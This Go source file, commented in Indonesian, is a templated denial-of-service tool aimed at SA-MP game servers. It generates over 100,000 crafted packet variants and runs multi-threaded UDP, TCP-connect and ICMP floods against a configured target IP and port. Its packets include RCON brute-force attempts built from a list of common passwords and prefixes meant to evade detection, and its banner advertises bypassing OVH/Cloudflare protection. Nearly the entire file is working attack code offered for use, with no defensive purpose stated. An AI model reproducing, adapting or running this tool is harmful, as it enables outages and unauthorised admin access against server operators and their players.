package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// ==================== TEMPLATE VARIABLES (DI-REPLACE OLEH main.py) ====================
var (
	targetIP   = "{{.TargetIP}}"
	targetPort = "{{.TargetPort}}"
	duration   = "{{.Duration}}"
	threads    = "{{.Threads}}"
	method     = "{{.Method}}"
)

// ==================== KONSTANTA PROTOKOL SAMP (100% VALID) ====================
const (
	// Struktur Packet SAMP [^4^][^2^]:
	// [4 bytes Prefix - Optional][4 bytes SAMP][4 bytes IP][2 bytes Port][1 byte Opcode][Payload]
	// Total minimum: 11 bytes (tanpa prefix), 15 bytes (dengan prefix)
	// Maximum: 512 bytes (server drop >512)
	
	SAMP_MAGIC = "SAMP"
	
	// Valid Opcodes SAMP
	OP_INFO    = 0x69 // 'i' - Information
	OP_RULES   = 0x72 // 'r' - Rules
	OP_PLAYERS = 0x63 // 'c' - Players (Client list)
	OP_DETAIL  = 0x64 // 'd' - Detailed player info
	OP_PING    = 0x70 // 'p' - Ping (4 bytes random)
	OP_RCON    = 0x78 // 'x' - RCON command
	
	// Protocol Limits [^4^]
	SAMP_MIN_SIZE = 11  // Minimum valid packet size
	SAMP_MAX_SIZE = 512 // Maximum before server drops
	
	// Network constants
	MAX_THREADS    = 50000
	SOCKET_BUF_SIZE = 16 * 1024 * 1024 // 16MB buffer
)

// ==================== GLOBAL STATE ====================
var (
	// Statistics (lock-free)
	totalPackets uint64 = 0
	totalBytes   uint64 = 0
	startTime    time.Time
	stopTime     time.Time
	
	// Target configuration
	targetAddr      *net.UDPAddr
	targetIPBytes   [4]byte
	targetPortInt   int
	targetPortBytes [2]byte // Little-endian [^4^]
	
	// Configuration
	cfg struct {
		threadCount   int
		durationSec   int
		attackMethod  string
		usePrefix     bool // 4-byte prefix bypass mode
		enableSpoof   bool // Raw socket mode
		burstMin      int
		burstMax      int
	}
	
	// Connection pools
	udpPool sync.Pool
	rngPool sync.Pool
	
	// Variant pools (100,000+ total)
	variants struct {
		standard   [][]byte // 50,000 - Standard SAMP (no prefix)
		withPrefix [][]byte // 50,000 - Dengan 4-byte prefix (bypass)
		rcon       [][]byte // 10,000 - RCON brute force variants
		ping       [][]byte // 10,000 - Ping variants dengan random data
		invalid    [][]byte // 5,000 - Invalid opcodes untuk fuzzing
	}
)

// ==================== STRUCTS ====================
type ConnPool struct {
	conn *net.UDPConn
	mu   sync.Mutex
	id   uint64
}

// ==================== MAIN ENTRY ====================
func main() {
	// Initialize
	if err := initConfig(); err != nil {
		fmt.Fprintf(os.Stderr, "Init error: %v\n", err)
		os.Exit(1)
	}
	
	// Setup network
	if err := setupNetwork(); err != nil {
		fmt.Fprintf(os.Stderr, "Network error: %v\n", err)
		os.Exit(1)
	}
	
	// Generate 100k+ variants
	generateVariants()
	
	// Initialize pools
	initPools()
	
	// Print info
	printBanner()
	
	// Execute attack
	executeAttack()
	
	// Wait and show stats
	waitAndReport()
}

// ==================== INITIALIZATION ====================
func initConfig() error {
	var err error
	
	// Parse duration
	cfg.durationSec, err = strconv.Atoi(duration)
	if err != nil || cfg.durationSec <= 0 {
		cfg.durationSec = 60
	}
	
	// Parse threads
	baseThreads, _ := strconv.Atoi(threads)
	if baseThreads <= 0 {
		baseThreads = 1000
	}
	cfg.threadCount = baseThreads * runtime.NumCPU()
	if cfg.threadCount > MAX_THREADS {
		cfg.threadCount = MAX_THREADS
	}
	
	// Parse method
	cfg.attackMethod = strings.ToUpper(strings.TrimSpace(method))
	if cfg.attackMethod == "" {
		cfg.attackMethod = "GOD"
	}
	
	// Default settings untuk bypass
	cfg.usePrefix = true
	cfg.burstMin = 1
	cfg.burstMax = 20
	
	// Cek raw socket capability (requires root)
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err == nil {
		syscall.Close(fd)
		cfg.enableSpoof = true
	} else {
		cfg.enableSpoof = false
	}
	
	// Setup timing
	stopTime = time.Now().Add(time.Duration(cfg.durationSec) * time.Second)
	startTime = time.Now()
	
	return nil
}

func setupNetwork() error {
	// Parse port
	port, err := strconv.Atoi(targetPort)
	if err != nil {
		return fmt.Errorf("invalid port: %v", err)
	}
	targetPortInt = port
	
	// Resolve address
	addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", targetIP, port))
	if err != nil {
		return fmt.Errorf("resolve failed: %v", err)
	}
	targetAddr = addr
	
	// Parse IP bytes (4 octets) [^4^]
	parts := strings.Split(targetIP, ".")
	if len(parts) != 4 {
		return fmt.Errorf("invalid IP format")
	}
	for i, p := range parts {
		val, err := strconv.Atoi(p)
		if err != nil || val < 0 || val > 255 {
			return fmt.Errorf("invalid IP octet: %s", p)
		}
		targetIPBytes[i] = byte(val)
	}
	
	// Port bytes (Little Endian) [^4^]
	// Byte 0: port & 0xFF, Byte 1: port >> 8 & 0xFF
	targetPortBytes[0] = byte(port & 0xFF)
	targetPortBytes[1] = byte((port >> 8) & 0xFF)
	
	return nil
}

func initPools() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	udpPool = sync.Pool{
		New: func() interface{} {
			conn, err := net.DialUDP("udp", nil, targetAddr)
			if err != nil {
				return nil
			}
			
			// Optimasi socket
			if file, err := conn.File(); err == nil {
				fd := int(file.Fd())
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, SOCKET_BUF_SIZE)
				syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4*1024*1024)
				syscall.SetNonblock(fd, true)
				file.Close()
			}
			
			return &ConnPool{
				conn: conn,
				id:   uint64(rand.Int63()),
			}
		},
	}
	
	rngPool = sync.Pool{
		New: func() interface{} {
			return rand.New(rand.NewSource(time.Now().UnixNano() + rand.Int63()))
		},
	}
}

// ==================== PACKET GENERATION (100,000+ VARIAN) ====================
func generateVariants() {
	fmt.Printf("[*] Generating packet variants (100,000+)...\n")
	
	// 1. Standard SAMP packets (50,000 varian) - Bytes: [SAMP][IP][Port][Opcode][Payload]
	variants.standard = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.standard[i] = buildSAMPPacket(i, false)
	}
	
	// 2. With Prefix (50,000 varian) - Bytes: [Prefix][SAMP][IP][Port][Opcode][Payload]
	variants.withPrefix = make([][]byte, 50000)
	for i := 0; i < 50000; i++ {
		variants.withPrefix[i] = buildSAMPPacket(i, true)
	}
	
	// 3. RCON packets (10,000 varian) - Brute force
	variants.rcon = make([][]byte, 10000)
	for i := 0; i < 10000; i++ {
		variants.rcon[i] = buildRCONPacket(i)
	}
	
	// 4. Ping packets (10,000 varian) - Dengan 4-byte random data [^4^]
	variants.ping = make([][]byte, 10000)
	for i := 0; i < 10000; i++ {
		variants.ping[i] = buildPingPacket(i)
	}
	
	// 5. Invalid opcodes (5,000 varian) - Fuzzing untuk bypass
	variants.invalid = make([][]byte, 5000)
	for i := 0; i < 5000; i++ {
		variants.invalid[i] = buildInvalidPacket(i)
	}
	
	fmt.Printf("[+] Generated: %d standard, %d prefix, %d rcon, %d ping, %d invalid\n",
		len(variants.standard), len(variants.withPrefix), len(variants.rcon), 
		len(variants.ping), len(variants.invalid))
}

// buildSAMPPacket: Membuat packet SAMP yang 100% valid [^4^]
// Structure: [4b Prefix?][4b SAMP][4b IP][2b Port][1b Opcode][0-491b Payload] = 11-512 bytes
func buildSAMPPacket(variant int, usePrefix bool) []byte {
	buf := new(bytes.Buffer)
	
	// Optional 4-byte prefix untuk bypass (0xFF, 0x00, Random, dll)
	if usePrefix {
		prefix := getPrefix(variant)
		buf.Write(prefix)
	}
	
	// Magic Header "SAMP" (Bytes 0-3 atau 4-7 tergantung prefix)
	buf.WriteString(SAMP_MAGIC)
	
	// IP Address (4 bytes, network order) - Bytes 4-7 atau 8-11
	buf.Write(targetIPBytes[:])
	
	// Port (2 bytes, Little Endian) [^4^] - Bytes 8-9 atau 12-13
	buf.Write(targetPortBytes[:])
	
	// Opcode (1 byte) - Byte 10 atau 14
	opcode := getOpcode(variant)
	buf.WriteByte(opcode)
	
	// Payload untuk mencapai size 16-512 bytes
	currentSize := buf.Len()
	targetSize := SAMP_MIN_SIZE + (variant % (SAMP_MAX_SIZE - SAMP_MIN_SIZE + 1))
	
	if targetSize > currentSize {
		padding := make([]byte, targetSize-currentSize)
		fillPattern(padding, variant)
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

// buildRCONPacket: Struktur RCON yang valid [^4^]
// [SAMP][IP][Port][0x78][PassLen(4b)][Password][CmdLen(4b)][Command]
func buildRCONPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// Header
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(OP_RCON)
	
	// Passwords list (34 base + random suffix)
	passwords := []string{
		"rcon", "password", "1234", "admin", "samp", "owner", "server",
		"123456", "qwerty", "letmein", "gta", "sanandreas", "changeme",
		"root", "toor", "pass", "samp037", "samp03DL", "gta_sa", 
		" multiplayer", "sa-mp", "12345", "111111", "dragon", "master",
		"shadow", "superman", "batman", "trustno1", "iloveyou", "princess",
		"football", "baseball", "welcome", "monkey", "696969",
	}
	
	commands := []string{
		"echo", "hostname", "gamemodetext", "mapname", "players", "maxplayers",
		"weburl", "worldtime", "weather", "loadfs", "unloadfs", "reloadfs",
		"ban", "kick", "kill", "say", "broadcast", "changemode", "gmx",
		"exit", "query", "rcon_password", "message", "cmdlist", "varlist",
	}
	
	// Password dengan random suffix (e.g., "rcon1234")
	basePass := passwords[variant%len(passwords)]
	suffix := strconv.Itoa(variant % 10000)
	pass := basePass + suffix
	
	cmd := commands[(variant/len(passwords))%len(commands)]
	
	passBytes := []byte(pass)
	cmdBytes := []byte(cmd)
	
	// Password length (4 bytes, little-endian) [^4^]
	binary.Write(buf, binary.LittleEndian, uint32(len(passBytes)))
	buf.Write(passBytes)
	
	// Command length (4 bytes, little-endian)
	binary.Write(buf, binary.LittleEndian, uint32(len(cmdBytes)))
	buf.Write(cmdBytes)
	
	// Pastikan size valid (truncate atau padding)
	result := buf.Bytes()
	if len(result) > SAMP_MAX_SIZE {
		result = result[:SAMP_MAX_SIZE]
	} else if len(result) < SAMP_MIN_SIZE {
		padding := make([]byte, SAMP_MIN_SIZE-len(result))
		result = append(result, padding...)
	}
	
	return result
}

// buildPingPacket: Opcode 'p' dengan 4 bytes random data [^4^]
func buildPingPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	buf.WriteByte(OP_PING)
	
	// 4 bytes pseudo-random data [^4^]
	data := make([]byte, 4)
	binary.BigEndian.PutUint32(data, uint32(variant*2654435761)) // LCG
	buf.Write(data)
	
	// Padding jika perlu
	if buf.Len() < SAMP_MIN_SIZE {
		padding := make([]byte, SAMP_MIN_SIZE-buf.Len())
		buf.Write(padding)
	}
	
	return buf.Bytes()
}

// buildInvalidPacket: Opcode invalid untuk fuzzing/bypass
func buildInvalidPacket(variant int) []byte {
	buf := new(bytes.Buffer)
	
	// Tambahkan prefix untuk bypass signature detection
	prefix := getPrefix(variant + 1000)
	buf.Write(prefix)
	
	buf.WriteString(SAMP_MAGIC)
	buf.Write(targetIPBytes[:])
	buf.Write(targetPortBytes[:])
	
	// Opcode invalid (di luar 0x69, 0x72, 0x63, 0x64, 0x70, 0x78)
	invalidOps := []byte{0x00, 0xFF, 0x41, 0x42, 0x43, 0x44, 0x45, 0x50, 0x51, 0x52}
	opcode := invalidOps[variant%len(invalidOps)]
	buf.WriteByte(opcode)
	
	// Random payload
	size := SAMP_MIN_SIZE + (variant % 100)
	payload := make([]byte, size-buf.Len())
	rand.Read(payload)
	buf.Write(payload)
	
	return buf.Bytes()
}

// ==================== HELPERS ====================
func getPrefix(variant int) []byte {
	prefixes := [][]byte{
		{0xFF, 0xFF, 0xFF, 0xFF}, // Quake style
		{0x00, 0x00, 0x00, 0x00}, // Null
		{0xAA, 0xAA, 0xAA, 0xAA}, // Pattern AA
		{0x55, 0x55, 0x55, 0x55}, // Pattern 55
		{0xDE, 0xAD, 0xBE, 0xEF}, // DEADBEEF
		{0xCA, 0xFE, 0xBA, 0xBE}, // CAFEBABE
	}
	
	if variant%10 < 6 {
		return prefixes[variant%len(prefixes)]
	}
	
	// Random prefix
	p := make([]byte, 4)
	rand.Read(p)
	return p
}

func getOpcode(variant int) byte {
	// 6 valid opcodes
	opcodes := []byte{OP_INFO, OP_RULES, OP_PLAYERS, OP_DETAIL, OP_PING, OP_RCON}
	return opcodes[variant%len(opcodes)]
}

func fillPattern(data []byte, variant int) {
	pattern := variant % 8
	switch pattern {
	case 0: // Random
		rand.Read(data)
	case 1: // Zeros
		// Already zero
	case 2: // 0xFF
		for i := range data {
			data[i] = 0xFF
		}
	case 3: // Sequential
		for i := range data {
			data[i] = byte(i % 256)
		}
	case 4: // Alternating AA/55
		for i := range data {
			if i%2 == 0 {
				data[i] = 0xAA
			} else {
				data[i] = 0x55
			}
		}
	case 5: // SAMP pattern
		for i := range data {
			data[i] = SAMP_MAGIC[i%4]
		}
	case 6: // Incremental from variant
		for i := range data {
			data[i] = byte((variant + i) % 256)
		}
	case 7: // Timestamp
		ts := uint32(time.Now().Unix())
		for i := range data {
			data[i] = byte(ts >> (8 * (i % 4)))
		}
	}
}

// ==================== ATTACK EXECUTION ====================
func executeAttack() {
	fmt.Printf("[ATTACK] Method: %s | Threads: %d | Target: %s:%d\n", 
		cfg.attackMethod, cfg.threadCount, targetIP, targetPortInt)
	
	switch cfg.attackMethod {
	case "SAMP":
		executeSAMPAttack()
	case "UDP":
		executeUDPFlood()
	case "MIX":
		executeMixedAttack()
	case "GOD":
		executeGodMode()
	default:
		executeGodMode()
	}
}

func executeSAMPAttack() {
	fmt.Printf("[VECTOR] SAMP Protocol Attack (100k+ variants)\n")
	fmt.Printf("[INFO] 50%% Standard + 30%% Prefix + 20%% RCON\n")
	
	var wg sync.WaitGroup
	
	// Distribusi threads
	stdCount := cfg.threadCount * 50 / 100
	prefixCount := cfg.threadCount * 30 / 100
	rconCount := cfg.threadCount - stdCount - prefixCount
	
	// Standard packets
	for i := 0; i < stdCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.standard)
		}(i)
	}
	
	// Prefix packets (bypass mode)
	for i := 0; i < prefixCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.withPrefix)
		}(i)
	}
	
	// RCON packets
	for i := 0; i < rconCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			workerSAMP(id, variants.rcon)
		}(i)
	}
	
	wg.Wait()
}

func workerSAMP(workerID int, pool [][]byte) {
	conn := getConn()
	if conn == nil {
		return
	}
	defer putConn(conn)
	
	rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(workerID)))
	
	for time.Now().Before(stopTime) {
		// Pilih packet random dari pool
		idx := rng.Intn(len(pool))
		packet := pool[idx]
		
		// Burst dengan variasi 1-20 packets
		burst := cfg.burstMin + rng.Intn(cfg.burstMax-cfg.burstMin+1)
		for b := 0; b < burst; b++ {
			sendPacket(conn, packet)
			
			// Micro-delay antara burst untuk menghindari pattern
			if b < burst-1 {
				spinWait(50 + rng.Intn(100)) // 50-150ns
			}
		}
		
		// Yield periodically
		if workerID%100 == 0 {
			runtime.Gosched()
		}
	}
}

func executeUDPFlood() {
	fmt.Printf("[VECTOR] Raw UDP Flood (Bypass OVH/Cloudflare)\n")
	
	var wg sync.WaitGroup
	
	for i := 0; i < cfg.threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				// Random size 16-512
				size := SAMP_MIN_SIZE + rng.Intn(SAMP_MAX_SIZE-SAMP_MIN_SIZE+1)
				payload := make([]byte, size)
				rng.Read(payload)
				
				// Tambahkan SAMP header di posisi random untuk confusion
				if id%3 == 0 {
					copy(payload[4:], []byte(SAMP_MAGIC))
				}
				
				sendPacket(conn, payload)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeMixedAttack() {
	fmt.Printf("[VECTOR] Mixed Mode\n")
	
	var wg sync.WaitGroup
	
	sampT := cfg.threadCount * 60 / 100
	udpT := cfg.threadCount - sampT
	
	// SAMP component
	for i := 0; i < sampT; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			if id%2 == 0 {
				workerSAMP(id, variants.standard)
			} else {
				workerSAMP(id, variants.withPrefix)
			}
		}(i)
	}
	
	// UDP component
	for i := 0; i < udpT; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			
			conn := getConn()
			if conn == nil {
				return
			}
			defer putConn(conn)
			
			rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
			
			for time.Now().Before(stopTime) {
				size := 64 + rng.Intn(448)
				pkt := make([]byte, size)
				rng.Read(pkt)
				sendPacket(conn, pkt)
			}
		}(i)
	}
	
	wg.Wait()
}

func executeGodMode() {
	fmt.Printf("[VECTOR] GOD MODE - Total Annihilation\n")
	
	vectors := map[string]int{
		"STANDARD": cfg.threadCount * 25 / 100,
		"PREFIX":   cfg.threadCount * 20 / 100,
		"RCON":     cfg.threadCount * 15 / 100,
		"PING":     cfg.threadCount * 10 / 100,
		"INVALID":  cfg.threadCount * 10 / 100,
		"UDP":      cfg.threadCount * 10 / 100,
		"TCP":      cfg.threadCount * 5 / 100,
		"ICMP":     cfg.threadCount * 5 / 100,
	}
	
	var wg sync.WaitGroup
	
	for vec, count := range vectors {
		switch vec {
		case "STANDARD":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.standard) }(i)
			}
		case "PREFIX":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.withPrefix) }(i)
			}
		case "RCON":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.rcon) }(i)
			}
		case "PING":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.ping) }(i)
			}
		case "INVALID":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) { defer wg.Done(); workerSAMP(id, variants.invalid) }(i)
			}
		case "UDP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					conn := getConn()
					if conn == nil { return }
					defer putConn(conn)
					rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
					for time.Now().Before(stopTime) {
						pkt := make([]byte, 256)
						rng.Read(pkt)
						sendPacket(conn, pkt)
					}
				}(i)
			}
		case "TCP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					for time.Now().Before(stopTime) {
						c, _ := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPortInt), time.Second)
						if c != nil {
							c.Close()
							atomic.AddUint64(&totalPackets, 1)
						}
						time.Sleep(time.Millisecond)
					}
				}(i)
			}
		case "ICMP":
			for i := 0; i < count; i++ {
				wg.Add(1)
				go func(id int) {
					defer wg.Done()
					c, err := net.Dial("ip4:icmp", targetIP)
					if err != nil { return }
					defer c.Close()
					pkt := make([]byte, 64)
					pkt[0] = 8 // Echo
					for time.Now().Before(stopTime) {
						c.Write(pkt)
						atomic.AddUint64(&totalPackets, 1)
						time.Sleep(time.Millisecond * 10)
					}
				}(i)
			}
		}
	}
	
	wg.Wait()
}

// ==================== UTILITY FUNCTIONS ====================
func getConn() *ConnPool {
	c := udpPool.Get()
	if c == nil {
		return nil
	}
	return c.(*ConnPool)
}

func putConn(c *ConnPool) {
	if c != nil && c.conn != nil {
		udpPool.Put(c)
	}
}

func sendPacket(c *ConnPool, data []byte) {
	if c == nil || len(data) == 0 {
		return
	}
	
	c.mu.Lock()
	n, err := c.conn.Write(data)
	c.mu.Unlock()
	
	if err == nil && n > 0 {
		atomic.AddUint64(&totalPackets, 1)
		atomic.AddUint64(&totalBytes, uint64(n))
	}
}

func spinWait(ns int) {
	start := time.Now()
	for time.Since(start).Nanoseconds() < int64(ns) {
		runtime.Gosched()
	}
}

func printBanner() {
	fmt.Printf("\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║              SAMP ULTIMATE ENGINE v8.0 - PROTOCOL PERFECTION                 ║\n")
	fmt.Printf("║        100%% Valid Structure | 125k Variants | Bypass OVH/Cloudflare          ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║ Target: %-22s Port: %-8d Threads: %-10d              ║\n", targetIP, targetPortInt, cfg.threadCount)
	fmt.Printf("║ Duration: %-20ds Method: %-12s Prefix: %-8v              ║\n", cfg.durationSec, cfg.attackMethod, cfg.usePrefix)
	fmt.Printf("║ Size: %d-%d bytes | Opcodes: 6 Valid + Invalid Fuzzing | Burst: %d-%d           ║\n", 
		SAMP_MIN_SIZE, SAMP_MAX_SIZE, cfg.burstMin, cfg.burstMax)
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
	fmt.Printf("\n")
}

func waitAndReport() {
	ticker := time.NewTicker(5 * time.Second)
	done := make(chan bool)
	
	go func() {
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				pkts := atomic.LoadUint64(&totalPackets)
				bytes := atomic.LoadUint64(&totalBytes)
				
				pps := float64(pkts) / elapsed
				mbps := (float64(bytes) * 8.0) / (elapsed * 1024 * 1024)
				
				fmt.Printf("\r⏳ %.0fs | PPS: %.0f | MBPS: %.1f | Packets: %s", 
					elapsed, pps, mbps, formatNum(pkts))
			case <-done:
				return
			}
		}
	}()
	
	time.Sleep(time.Until(stopTime))
	done <- true
	ticker.Stop()
	
	printFinalStats()
}

func printFinalStats() {
	pkts := atomic.LoadUint64(&totalPackets)
	bytes := atomic.LoadUint64(&totalBytes)
	dur := uint64(cfg.durationSec)
	
	fmt.Printf("\n\n")
	fmt.Printf("╔══════════════════════════════════════════════════════════════════════════════╗\n")
	fmt.Printf("║                           FINAL ATTACK STATISTICS                            ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════════════════════════════════╣\n")
	fmt.Printf("║  📦 TOTAL PACKETS:  %-20s                                   ║\n", formatNum(pkts))
	fmt.Printf("║  📊 TOTAL DATA:     %-10.2f MB (%-6.2f GB)                           ║\n", 
		float64(bytes)/(1024*1024), float64(bytes)/(1024*1024*1024))
	fmt.Printf("║  ⚡ AVERAGE PPS:    %-20s                                   ║\n", formatNum(pkts/dur))
	fmt.Printf("║  🌐 AVERAGE MBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024))
	fmt.Printf("║  💀 AVERAGE GBPS:   %-10.2f                                   ║\n", 
		(float64(bytes*8)/float64(dur))/(1024*1024*1024))
	fmt.Printf("╚══════════════════════════════════════════════════════════════════════════════╝\n")
}

func formatNum(n uint64) string {
	if n < 1000 {
		return fmt.Sprintf("%d", n)
	}
	if n < 1000000 {
		return fmt.Sprintf("%.1fK", float64(n)/1000)
	}
	if n < 1000000000 {
		return fmt.Sprintf("%.1fM", float64(n)/1000000)
	}
	return fmt.Sprintf("%.1fB", float64(n)/1000000000)
}
